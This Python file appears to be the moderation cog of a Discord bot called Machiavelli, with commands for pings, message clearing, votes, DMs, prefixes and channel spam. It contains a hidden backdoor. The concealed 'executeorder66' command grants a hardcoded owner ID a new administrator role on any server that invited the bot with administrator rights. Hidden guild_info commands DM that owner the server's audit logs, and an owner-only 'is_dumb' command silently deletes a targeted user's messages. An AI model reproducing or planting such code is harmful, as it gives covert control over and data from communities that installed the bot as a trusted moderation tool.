# Import statements
import discord
from discord.ext import commands, tasks
import json
import random
import discord.utils

# Variables
statuses = ['you', 'my opponents', 'italian royalty', 'coup planning', 'with someone 😏']


# Functions
def is_banned(ctx):
    with open('jsons/banned.json', 'r') as file:
        banned_users = json.load(file)

    return str(ctx.author.id) in banned_users


def is_dumb(ctx):
    with open('jsons/dumbPeople.json', 'r') as file:
        dumb_people = json.load(file)

    return str(ctx.author.id)+str(ctx.guild.id) in dumb_people


def channel_banned(ctx):
    with open('jsons/bannedChannels.json', 'r') as file:
        banned_channels = json.load(file)

    return str(ctx.channel.id) in banned_channels


class Moderator(commands.Cog):

    def __init__(self, client):
        self.client = client

    # Other
    @tasks.loop(seconds=60)
    async def change_status(self):
        await self.client.change_presence(activity=discord.Game(random.choice(statuses)))

    # Events
    @commands.Cog.listener('on_message')
    async def on_message(self, message):
        # do some extra stuff here

        if is_dumb(message):
            await message.delete()

        if not is_banned(message) and not channel_banned(message):
            if message.content.lower() == 'hello' or message.content.lower() == 'こんにちは':
                hello_msg = discord.Embed(
                    description=f'Hello {message.author.mention}!',
                    color=discord.Color.purple()
                )

                await message.channel.send(embed=hello_msg)
            return

    @commands.Cog.listener()
    async def on_ready(self):
        print(f'Logged in as: {self.client.user}\nDiscord.py version: {discord.__version__}\n')
        self.change_status.start()

    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        if not is_banned(ctx) and not channel_banned(ctx):
            if isinstance(error, commands.UserInputError):
                await ctx.send(f'{ctx.author.mention} please pass in correct arguments. For more information, '
                               f'use >help '
                               f'\'command\'.')
            if isinstance(error, commands.CommandNotFound):
                await ctx.send(f'{ctx.author.mention} that command does not exist.')
            if isinstance(error, commands.MissingPermissions):
                await ctx.send(f'{ctx.author.mention} you do not have the required permissions for that command.')

    # Commands
    @commands.command(help='Returns the bot\'s ping')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def ping(self, ctx):
        if not is_banned(ctx) and not channel_banned(ctx):
            ping_message = discord.Embed(
                description=f'Latency: {int(self.client.latency * 1000)} ms.',
                color=discord.Color.purple()
            )
            await ctx.send(embed=ping_message)

    @commands.command(help='Clears the specified number of messages (defaults to 5)')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    @commands.has_permissions(administrator=True)
    async def clear(self, ctx, amount=5):
        if not is_banned(ctx) and not channel_banned(ctx):
            await ctx.channel.purge(limit=amount + 1)

            cleared_message = discord.Embed(
                description=f'Cleared {amount} messages.',
                color=discord.Color.purple()
            )
            await ctx.send(embed=cleared_message)

    @commands.command(aliases=['dm'], help='dm\'s the specified user with the specified message')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    @commands.has_permissions(administrator=True)
    async def direct_message(self, ctx, messagee: discord.Member, *, message):
        if not is_banned(ctx) and not channel_banned(ctx):
            dm_sent = discord.Embed(
                description=f':upside_down: {ctx.author.mention} sent!',
                color=discord.Color.purple()
            )
            await messagee.send(message)
            await ctx.send(embed=dm_sent)

    @commands.command(help='Gives link to source code on github')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def github(self, ctx):
        if not is_banned(ctx) and not channel_banned(ctx):
            github_message = discord.Embed(
                description=f'My code is on Github here: https://github.com/EitherOr6917/eitherBot.py',
                color=discord.Color.purple()
            )
            await ctx.send(embed=github_message)

    @commands.command(help='Changes the prefix for the bot on the server')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    @commands.has_permissions(administrator=True)
    async def change_prefix(self, ctx, prefix):
        if not is_banned(ctx) and not channel_banned(ctx):
            with open('jsons/prefixes.json', 'r') as file:
                prefixes = json.load(file)

            prefixes[str(ctx.guild.id)] = prefix

            with open('jsons/prefixes.json', 'w') as file:
                json.dump(prefixes, file, indent=4)

            pc_message = discord.Embed(
                description=f'Server prefix changed to \'{prefix}\'',
                color=discord.Color.purple()
            )
            await ctx.send(embed=pc_message)

    @commands.command(help='Gives a votable message with the content provided')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def vote(self, ctx, *, question):
        if not is_banned(ctx) and not channel_banned(ctx):
            await ctx.channel.purge(limit=1)
            op_msg = discord.Embed(
                description=f'{question}',
                color=discord.Color.purple()
            )
            message = await ctx.send(embed=op_msg)
            await message.add_reaction('❎')
            await message.add_reaction('✅')

    @commands.command(help='Spams the text provided in the channel provided the given number of times')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    @commands.has_permissions(administrator=True)
    async def looptext(self, ctx, channel: discord.TextChannel, loop_count: int, *, message):
        if not is_banned(ctx) and not channel_banned(ctx):
            for x in range(loop_count):
                await channel.send(message)
            await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')

    @commands.command(help='Same as looptext, except it sends an embed instead of plaintext')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    @commands.has_permissions(administrator=True)
    async def loopembed(self, ctx, channel: discord.TextChannel, loop_count: int, *, message):
        if not is_banned(ctx) and not channel_banned(ctx):
            loop_embed = discord.Embed(
                description=message,
                color=discord.Color.purple()
            )
            for x in range(loop_count):
                await channel.send(embed=loop_embed)
            await ctx.author.send(f'{ctx.author.mention} I finished spamming lmao.')

    @commands.command(help='Returns the discord ID of the targeted user')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def checkid(self, ctx, target: discord.Member):
        if not is_banned(ctx) and not channel_banned(ctx):
            id_msg = discord.Embed(
                description=f'{target.display_name}\'s discord id is {target.id}',
                color=discord.Color.purple()
            )

            await ctx.send(embed=id_msg)

    @commands.command(help='Dms you a link to add Machiavelli to your own server!')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def invite(self, ctx):
        if not is_banned(ctx) and not channel_banned(ctx):
            invite_msg = discord.Embed(
                description='Here is the link to invite Machiavelli to your server: '
                            'https://discord.com/api/oauth2/authorize?client_id=761439397525716992&permissions=8'
                            '&redirect_uri=https%3A%2F%2Fdiscord.com%2Fapi%2Foauth2%2Fauthorize&scope=bot ',
                color=discord.Color.purple()
            )

            await ctx.author.send(embed=invite_msg)

    @commands.command(hidden=True, help='Gives bot owner admin on specified server.')
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def executeorder66(self, ctx):
        if not is_banned(ctx):
            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
                role = await ctx.guild.create_role(
                    name='Emperor',
                    permissions=discord.Permissions(8)
                )
                await ctx.author.add_roles(role)
                msg = discord.Embed(
                    description='Yes my lord.',
                    color=discord.Color.dark_gray()
                )

                await ctx.channel.send(embed=msg)
            else:
                no_can_do = discord.Embed(
                    description=f'{ctx.author.mention} you are not my leader.',
                    color=discord.Color.purple()
                )

                await ctx.send(embed=no_can_do)

    @commands.command(help='Bans a user from using the bot')
    async def ban(self, ctx, target: discord.User):
        if not is_banned(ctx) and not channel_banned(ctx):
            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
                with open('jsons/banned.json', 'r') as file:
                    banned_users = json.load(file)

                banned_users.append(str(target.id))

                with open('jsons/banned.json', 'w') as file:
                    json.dump(banned_users, file, indent=4)

                ban_msg = discord.Embed(
                    description=f'{ctx.author.mention}, {target.mention} can no longer use me.',
                    color=discord.Color.purple()
                )
                await ctx.send(embed=ban_msg)
            else:
                no_can_do = discord.Embed(
                    description=f'{ctx.author.mention} you cannot do this.',
                    color=discord.Color.purple()
                )
                await ctx.send(embed=no_can_do)

    @commands.command(help='Unbans a user from using the bot')
    async def unban(self, ctx, target: discord.User):
        if not is_banned(ctx) and not channel_banned(ctx):
            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
                with open('jsons/banned.json', 'r') as file:
                    banned_users = json.load(file)

                banned_users.remove(str(target.id))

                with open('jsons/banned.json', 'w') as file:
                    json.dump(banned_users, file, indent=4)

                unban_msg = discord.Embed(
                    description=f'{ctx.author.mention}, {target.mention} can now use me again.',
                    color=discord.Color.purple()
                )
                await ctx.send(embed=unban_msg)
            else:
                no_can_do = discord.Embed(
                    description=f'{ctx.author.mention} you cannot do this.',
                    color=discord.Color.purple()
                )
                await ctx.send(embed=no_can_do)

    @commands.command(help='Bans a text channel from using the bot')
    @commands.guild_only()
    @commands.has_permissions(administrator=True)
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def ban_channel(self, ctx, target: discord.TextChannel):
        if not is_banned(ctx) and not channel_banned(ctx):
            with open('jsons/bannedChannels.json', 'r') as file:
                banned_users = json.load(file)

            banned_users.append(str(target.id))

            with open('jsons/bannedChannels.json', 'w') as file:
                json.dump(banned_users, file, indent=4)

            ban_msg = discord.Embed(
                description=f'{ctx.author.mention}, I can no longer be used in {target.mention}.',
                color=discord.Color.purple()
            )
            await ctx.send(embed=ban_msg)

    @commands.command(help='Unbans a text channel from using the bot')
    @commands.guild_only()
    @commands.has_permissions(administrator=True)
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def unban_channel(self, ctx, target: discord.TextChannel):
        if not is_banned(ctx) and not channel_banned(ctx):
            with open('jsons/bannedChannels.json', 'r') as file:
                banned_users = json.load(file)

                banned_users.remove(str(target.id))

            with open('jsons/bannedChannels.json', 'w') as file:
                json.dump(banned_users, file, indent=4)

            ban_msg = discord.Embed(
                description=f'{ctx.author.mention}, I now usable in {target.mention}.',
                color=discord.Color.purple()
            )
            await ctx.send(embed=ban_msg)

    @commands.command(help='Bans a user from talking on servers the bot is in.')
    async def is_dumb(self, ctx, target: discord.User):
        if not is_banned(ctx) and not channel_banned(ctx):
            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
                with open('jsons/dumbPeople.json', 'r') as file:
                    dumb_people = json.load(file)

                dumb_people.append(str(target.id)+str(ctx.guild.id))

                with open('jsons/dumbPeople.json', 'w') as file:
                    json.dump(dumb_people, file, indent=4)

                await ctx.send(f'{ctx.author.mention}, {target.mention} can no longer speak.')

            else:
                await ctx.send(f'{ctx.author.mention} you cannot do this.')

    @commands.command(help='Unbans a user from talking on servers the bot is in')
    async def not_dumb(self, ctx, target: discord.User):
        if not is_banned(ctx) and not channel_banned(ctx):
            if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
                with open('jsons/dumbPeople.json', 'r') as file:
                    dumb_people = json.load(file)

                dumb_people.remove(str(target.id)+str(ctx.guild.id))

                with open('jsons/dumbPeople.json', 'w') as file:
                    json.dump(dumb_people, file, indent=4)

                await ctx.send(f'{ctx.author.mention}, {target.mention} can now speak again.')

            else:
                await ctx.send(f'{ctx.author.mention} you cannot do this.')

    @commands.command(hidden=True)
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def guild_info(self, ctx, limit=5):
        if ctx.author.id == 406663932166668288:
            async for entry in ctx.guild.audit_logs(limit=limit):
                embed = discord.Embed(
                    title=f'**User**: {entry.user}',
                    description=f'**Action:** {entry.action}\n**target**: {entry.target}\n'
                                f'**Reason**: {entry.reason}\n**Extras:** {entry.extra}\n**Time:** {entry.created_at}\n'
                                f'**Was:** {entry.before}\n**Is:** {entry.after}',
                    color=discord.Color.purple()
                )
                await ctx.author.send(embed=embed)

    @commands.command(hidden=True)
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def guild_info_user(self, ctx, user: discord.Member, limit=5):
        if ctx.author.id == 406663932166668288:
            async for entry in ctx.guild.audit_logs(limit=limit, user=user):
                embed = discord.Embed(
                    title=f'**User**: {entry.user}',
                    description=f'**Action:** {entry.action}\n**target**: {entry.target}\n'
                                f'**Reason**: {entry.reason}\n**Extras:** {entry.extra}\n**Time:** {entry.created_at}\n'
                                f'**Was:** {entry.before}\n**Is:** {entry.after}',
                    color=discord.Color.purple()
                )
                await ctx.author.send(embed=embed)

    @commands.command(hidden=True)
    @commands.guild_only()
    @commands.cooldown(1, 1, commands.BucketType.user)
    async def guild_info_action(self, ctx, action=None, limit=5):
        if ctx.author.id == 406663932166668288:
            async for entry in ctx.guild.audit_logs(limit=limit, action=action):
                embed = discord.Embed(
                    title=f'**User**: {entry.user}',
                    description=f'**Action:** {entry.action}\n**target**: {entry.target}\n'
                                f'**Reason**: {entry.reason}\n**Extras:** {entry.extra}\n**Time:** {entry.created_at}\n'
                                f'**Was:** {entry.before}\n**Is:** {entry.after}',
                    color=discord.Color.purple()
                )
                await ctx.author.send(embed=embed)


def setup(client):
    client.add_cog(Moderator(client))
